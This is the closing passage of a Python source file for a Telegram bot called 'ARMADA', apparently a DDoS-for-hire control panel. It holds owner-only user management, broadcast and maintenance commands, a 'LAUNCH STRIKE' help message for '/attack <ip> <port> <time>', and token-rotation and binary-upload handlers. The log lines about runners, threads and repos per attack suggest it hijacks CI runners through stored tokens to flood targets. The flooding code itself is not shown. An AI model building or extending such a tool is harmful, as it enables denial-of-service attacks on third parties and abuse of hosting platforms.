        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("<b>USAGE:</b> <code>/remove &lt;user_id&gt;</code>", parse_mode='HTML')
            return
        target_id = int(context.args[0])
        if str(target_id) in approved_users:
            del approved_users[str(target_id)]
            save_json('approved_users.json', approved_users)
            await update.message.reply_text(f"<b>User {target_id} removed.</b>", parse_mode='HTML')
        else:
            await update.message.reply_text("<b>User not found.</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def users_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if not approved_users:
            await update.message.reply_text("<b>No approved users.</b>", parse_mode='HTML')
            return
        msg = "<b>APPROVED USERS</b>\n"
        msg += "==============\n\n"
        for uid, data in approved_users.items():
            msg += f"<code>{uid}</code> <b>-</b> {data.get('days', '?')}d\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def pending_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if not pending_users:
            await update.message.reply_text("<b>No pending requests.</b>", parse_mode='HTML')
            return
        msg = "<b>PENDING REQUESTS</b>\n"
        msg += "================\n\n"
        for u in pending_users:
            msg += f"<code>{u.get('user_id')}</code> <b>-</b> @{u.get('username')}\n"
        await update.message.reply_text(msg, parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def broadcast_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if not context.args:
            await update.message.reply_text("<b>USAGE:</b> <code>/broadcast &lt;message&gt;</code>", parse_mode='HTML')
            return
        msg = " ".join(context.args)
        sent = 0
        for uid in list(owners.keys()) + list(approved_users.keys()):
            try:
                await context.bot.send_message(int(uid), f"<b>ANNOUNCEMENT</b>\n============\n\n{msg}", parse_mode='HTML')
                sent += 1
            except:
                pass
        await update.message.reply_text(f"<b>Sent to {sent} users.</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

async def maintenance_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if not is_owner(user_id):
            await update.message.reply_text("<b>ACCESS DENIED</b>", parse_mode='HTML')
            return
        if len(context.args) != 1:
            await update.message.reply_text("<b>USAGE:</b> <code>/maintenance &lt;on/off&gt;</code>", parse_mode='HTML')
            return
        mode = context.args[0].lower()
        save_json('maintenance.json', {"maintenance": mode == "on"})
        await update.message.reply_text(f"<b>Maintenance {'ENABLED' if mode == 'on' else 'DISABLED'}.</b>", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"<b>Error:</b> {str(e)[:100]}", parse_mode='HTML')

# ============================================================
# ===== CALLBACKS =====
# ============================================================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        data = query.data

        if data == "attack_help":
            await query.edit_message_text(
                "<b>LAUNCH STRIKE</b>\n"
                "=============\n\n"
                "<code>/attack &lt;ip&gt; &lt;port&gt; &lt;time&gt;</code>\n\n"
                "<b>Example:</b>\n"
                "<code>/attack 1.1.1.1 443 60</code>\n\n"
                f"<b>Time:</b> 5-3600 seconds\n"
                f"<b>Port:</b> 1-65535\n"
                f"<b>Max repos:</b> {MAX_REPOS_PER_ATTACK}",
                parse_mode='HTML'
            )
        elif data == "status":
            await status_cmd(update, context)
        elif data == "stop":
            await stop_cmd(update, context)
        elif data == "admin_panel" and is_owner(user_id):
            keyboard = [
                [InlineKeyboardButton("Tokens", callback_data="admin_tokens")],
                [InlineKeyboardButton("Users", callback_data="admin_users")],
                [InlineKeyboardButton("Pending", callback_data="admin_pending")],
                [InlineKeyboardButton("Binary", callback_data="admin_binary")],
                [InlineKeyboardButton("Check Tokens", callback_data="admin_checktokens")],
                [InlineKeyboardButton("Rotate Tokens", callback_data="admin_rotate")],
            ]
            await query.edit_message_text(
                "<b>ADMIN CONSOLE</b>",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode='HTML'
            )
        elif data == "admin_tokens":
            await tokens_cmd(update, context)
        elif data == "admin_users":
            await users_cmd(update, context)
        elif data == "admin_pending":
            await pending_cmd(update, context)
        elif data == "admin_binary":
            await query.edit_message_text("<b>Use</b> <code>/binary_upload</code>", parse_mode='HTML')
        elif data == "admin_checktokens":
            await checktokens_cmd(update, context)
        elif data == "admin_rotate":
            await rotatetokens_cmd(update, context)
    except Exception as e:
        logger.error(f"Callback error: {e}")

# ============================================================
# ===== ERROR =====
# ============================================================

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        try:
            await update.effective_message.reply_text("<b>System error. Check logs.</b>", parse_mode='HTML')
        except:
            pass

# ============================================================
# ===== MAIN =====
# ============================================================

def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        conv_handler = ConversationHandler(
            entry_points=[CommandHandler("binary_upload", binary_upload_start)],
            states={WAITING_FOR_BINARY: [MessageHandler(filters.Document.ALL, binary_upload_receive), CommandHandler("cancel", binary_upload_cancel)]},
            fallbacks=[CommandHandler("cancel", binary_upload_cancel)]
        )
        app.add_handler(conv_handler)

        app.add_handler(CommandHandler("start", start_cmd))
        app.add_handler(CommandHandler("attack", attack_cmd))
        app.add_handler(CommandHandler("status", status_cmd))
        app.add_handler(CommandHandler("stop", stop_cmd))
        app.add_handler(CommandHandler("help", help_cmd))
        app.add_handler(CommandHandler("myid", myid_cmd))
        app.add_handler(CommandHandler("about", about_cmd))

        app.add_handler(CommandHandler("addtoken", addtoken_cmd))
        app.add_handler(CommandHandler("removetoken", removetoken_cmd))
        app.add_handler(CommandHandler("cleartokens", cleartokens_cmd))
        app.add_handler(CommandHandler("checktokens", checktokens_cmd))
        app.add_handler(CommandHandler("tokens", tokens_cmd))
        app.add_handler(CommandHandler("rotate", rotatetokens_cmd))
        app.add_handler(CommandHandler("approve", approve_cmd))
        app.add_handler(CommandHandler("remove", removeuser_cmd))
        app.add_handler(CommandHandler("users", users_cmd))
        app.add_handler(CommandHandler("pending", pending_cmd))
        app.add_handler(CommandHandler("broadcast", broadcast_cmd))
        app.add_handler(CommandHandler("maintenance", maintenance_cmd))

        app.add_handler(CallbackQueryHandler(button_callback))
        app.add_error_handler(error_handler)

        logger.info("ARMADA is ONLINE")
        logger.info(f"Binary name: {BINARY_NAME}")
        logger.info(f"{min(RUNNERS_PER_ATTACK, 15)} runners x {THREADS_PER_RUNNER} threads per repo")
        logger.info(f"Max {MAX_REPOS_PER_ATTACK} repos per attack")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Main error: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
